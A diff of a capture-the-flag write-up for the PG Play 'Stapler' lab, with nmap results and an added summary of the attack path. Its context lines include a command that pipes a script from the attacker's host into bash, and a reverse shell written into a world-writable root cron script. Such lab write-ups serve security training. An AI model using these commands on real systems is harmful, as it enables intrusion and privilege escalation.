@@ -1,13 +1,15 @@
 ---
 render_with_liquid: false
-title: PG Play  Stapler
+title: PG Play - Stapler
 date: 2024-01-05 15:08:44 +1400
 tags: [pg-play, nmap, linux, autorecon, feroxbuster, enum4linux, smb, hydra, password-spraying, weak-credentials, bash-script, sambacry, discover-history, sudo]
 ---
 
 
 
-# Learnt / Summary
+In this lab, we will exploit multiple misconfigurations and vulnerabilities in the system. First, we will use a Local File Inclusion (LFI) vulnerability in a WordPress plugin to extract the application's configuration file. Using database credentials, we will write a web shell to the server via MySQL file writing. Finally, we escalate our privileges by recovering a plaintext password from a bash history file and abusing unrestricted sudo permissions. It will work on both VMware and Virtualbox. REBOOT the VM if you CHANGE network modes. Fusion users, you'll need to retry when importing. There are multiple methods to-do this machine. At least two (2) paths to get a limited shell. At least three (3) ways to get a root access.
+
+# Learnt
 
 - 
 
@@ -35,7 +37,6 @@ sudo $(which autorecon) -vv --dirbuster.wordlist="/usr/share/seclists/Discovery/
 ### TCP
 
 ```ruby
-
 # Nmap 7.94SVN scan initiated Fri Jan  5 15:08:44 2024 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,22,53,80,139,666,3306,12380 Stapler
 Nmap scan report for Stapler (192.168.176.148)
 Host is up, received user-set (0.28s latency).
@@ -186,14 +187,12 @@ Host script results:
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Fri Jan  5 15:09:34 2024 -- 1 IP address (1 host up) scanned in 50.05 seconds
 ```
 
 ### UDP
 
 ```ruby
-
 # Nmap 7.94SVN scan initiated Sun Jan  7 04:00:59 2024 as: nmap -vv --reason -Pn -T4 -sU -sVC --top-ports 100 -oA ./nmap/top_100_udp stapler
 Increasing send delay for 192.168.205.148 from 0 to 50 due to 11 out of 15 dropped probes since last increase.
 Warning: 192.168.205.148 giving up on port because retransmission cap hit (6).
@@ -244,7 +243,6 @@ Host script results:
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Sun Jan  7 04:05:22 2024 -- 1 IP address (1 host up) scanned in 263.32 seconds
 ```
 
@@ -855,7 +853,6 @@ SHayslett@red:~$ curl 192.168.45.172/linpeas.sh|bash
 SHayslett@red:~$ ls -la /usr/local/sbin/cron-logrotate.sh
 -rwxrwxrwx 1 root root 51 Jun  3  2016 /usr/local/sbin/cron-logrotate.sh
 SHayslett@red:~$ cat /usr/local/sbin/cron-logrotate.sh
-
 #Simon, you really need to-do something about this
 SHayslett@red:~$ echo '/bin/bash -c "bash -i >& /dev/tcp/192.168.45.172/1111 0>&1"' > /usr/local/sbin/cron-logrotate.sh
 ```
